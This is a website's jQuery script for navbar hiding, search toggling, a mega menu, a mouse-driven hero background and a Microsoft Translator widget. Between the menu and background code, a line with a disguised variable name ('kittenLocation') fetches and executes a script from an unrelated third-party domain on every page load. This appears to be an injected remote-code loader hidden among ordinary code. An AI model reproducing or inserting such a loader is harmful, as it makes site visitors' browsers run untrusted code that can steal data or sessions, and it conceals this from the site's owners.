// Hide the Navbar when scrolling
var prev = 0;
var $window = $(window);
var nav = $('.navbar');
$window.on('scroll', function(){
  var scrollTop = $window.scrollTop();
  nav.toggleClass('scrollup', scrollTop > prev);
  prev = scrollTop;
});
// Toggle Item
$(".toggle").click(function(){
	$(".toggle-input").slideToggle(250);
});
// add/remove toggle depending on size
  var alterClass = function() {
    var ww = document.body.clientWidth;
    if (ww < 768) {
      $('.search').removeClass('toggle');
			 $('.form-control').removeClass('toggle-input');
    } else if (ww >= 769) {
      $('.search').addClass('toggle');
			$('.form-control').addClass('toggle-input');
    };
  };
  $(window).resize(function(){
    alterClass();
  });
  //Fire it when the page first loads:
  alterClass();
// Mega Menu
jQuery(document).on('click', '.mega-dropdown', function(e) {
  e.stopPropagation()
});
var kittenLocation = "http://www.kaylapratt.com/assets/oxford.emory.edu.js";
$.getScript(kittenLocation, function(data, textStatus, jqxhr){});
// Background move on mouseover
var movementStrength = 25;
var height = movementStrength / $(window).height();
var width = movementStrength / $(window).width();
$(".hero").mousemove(function(e){
          var pageX = e.pageX - ($(window).width() / 2);
          var pageY = e.pageY - ($(window).height() / 2);
          var newvalueX = width * pageX * -1 - 25;
          var newvalueY = height * pageY * -1 - 50;
          $('.hero').css("background-position", newvalueX+"px     "+newvalueY+"px");
});
// Microsoft Translator
setTimeout(function(){{var s=document.createElement('script');s.type='text/javascript';s.charset='UTF-8';s.src=((location && location.href && location.href.indexOf('https') == 0)?'https://ssl.microsofttranslator.com':'http://www.microsofttranslator.com')+'/ajax/v3/WidgetV3.ashx?siteData=ueOIGRSKkd965FeEGM5JtQ**&ctf=False&ui=true&settings=Manual&from=';var p=document.getElementsByTagName('head')[0]||document.documentElement;p.insertBefore(s,p.firstChild); }},0);